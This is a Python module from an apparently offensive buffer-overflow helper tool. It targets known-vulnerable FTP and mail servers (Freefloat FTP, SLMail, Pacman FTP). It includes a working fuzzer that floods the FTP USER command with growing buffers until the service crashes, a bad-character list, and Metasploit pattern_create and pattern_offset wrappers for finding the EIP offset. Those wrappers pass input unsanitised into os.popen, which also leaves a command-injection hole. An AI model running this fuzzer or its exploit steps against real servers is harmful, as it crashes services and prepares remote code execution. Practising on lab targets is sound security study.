try:
    from rsc.color import Color
    from rsc.config import Util as config
    import socket
    import os
    import sys
    import time
    import subprocess
except ImportError as err:
    print("Error: ", str(err))
    sys.exit()

class Tools:
    BADCHAR = ['\x00', '\x0a', '\x0d', '\x20', '\x40']
    APPS = ['Freefloat FTP', 'SLMail', 'Pacman FTP']

    @staticmethod
    def fuzzerBof(target, rport):
        # target = config.checkIP(target)
        # port = config.checkPort(port)

        # create an array of buffers of varying lengths
        buffer = ["A"]
        counter = 20

        while len(buffer) <= 30:
            buffer.append("A" * counter)
            counter += 100

        cont = -1
        # now we step through the buffers
        for string in buffer:
            print("Sending buffer length " + str(len(string)))
            try:
                cont += 1
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.connect((str(target), int(rport)))
                s.recv(1024)
                s.settimeout(2.0)
                s.send(str.encode("USER " + string + "\r\n"))
                s.recv(1024)
                s.send(str.encode("PASS anonymous\r\n"))
                s.recv(1024)
                s.settimeout(None)
                s.send(str.encode("QUIT\r\n"))
                s.close()
            except ConnectionError as err:
                if err.errno == 104:
                    Color.pl("\n{Y}[{R}!{Y}] {W}Apparently the application has been crashed")
                    Color.pl("{RL}Error: "+str(err)+"{W}")
                    lenBof = int(len(buffer[cont]))+80
                    Color.pl("The magic number se need is: ~{G}" + str(lenBof) + "{W}")
                    return int(lenBof)
                elif (err.errno == 111) and (len(string) <= 20):
                    Color.pl("\n{Y}[{R}!{Y}] {W}Please, check if the application has been started.")
                    Color.pl("{RL}Error: "+str(err)+"{W}")
                    break
                else:
                    Color.pl("{RL}[{R}!!{RL}] Something appers wrong{W}")
                    Color.pl("{RL}Error: "+str(err)+"{W}")
                    sys.exit(2)
            except Exception as err:
                    Color.pl("{R}"+str(err)+"{W}")

    @staticmethod
    def assistantMode(target, rport):
        Color.pl("{B}Assistant mode{Y} has been set.{W}")
        # Exibe as aplicações que podem ser exploradas pelo usuario
        choice = Tools.selectApps()
        while not choice.isnumeric():
            os.system("clear")
            Color.pl("\n{!} {R}Insert just a valid number!")
            choice = Tools.selectApps()
        else:
            if int(choice) <= len(Tools.APPS) and int(choice) > 0:
                Color.pl("{G}Application set: {Y}%s {W}" % str(Tools.APPS[int(choice)-1]))
                Color.pl("{*}{B}Starting Overflow{W}")
                Color.pl("{+}{G}Step 1 - {Y}Fuzzing{W}")
                eip = Tools.fuzzerBof(target, rport)

            else:
                Color.pl("{P}Invalid option, try again script kiddie.")
                sys.exit()

    @staticmethod
    def checkApps():
        c = 0
        for app in Tools.APPS:
            c += 1
            Color.pl("[{C}%s{W}] {R}%s{W}" % (str(c), str(app)))

    @staticmethod
    def selectApps():
        Color.pl("\n{G}Which Apps would you like to exploit with this tool?{W}")
        Tools.checkApps()
        Color.p("\n{G}Please, choose an app to start: {Y}")
        choice = input("")
        Color.p("{W}")
        return choice

    @staticmethod
    def pattern_create(bof):
        Color.p("{G}Generating pattern to overflow application{W}")
        for i in range(3):
            Color.p("{BL}{G}.{D}{W}")
            time.sleep(1)
        try:
            return os.popen("msf-pattern_create -l %s" % str(bof)).read()
        except OSError as err:
            Color.pl("{R}----- An error occurs -----")
            Color.pl("{RL}"+str(err)+"{W}")

    @staticmethod
    def pattern_offset(eip):
        if len(eip) == 8:
            try:
                return os.popen("msf-pattern_offset -q %s" % str(eip)).read()
            except OSError as err:
                Color.pl("{R}----- An error occurs -----")
                Color.pl("{RL}" + str(err) + "{W}")
        else:
            Color.pl("{G}Your input in {Y}-e{G} param is equal to: {G}"+str(eip)+"{G}. Is is rigth?{W}")
            Color.pl("{G}Remember that usually the content of the EIP address have 8 chars in hexadecimal{W}")
            Color.pl("{G}So, check on debbuger what's the value on this field.{W}")

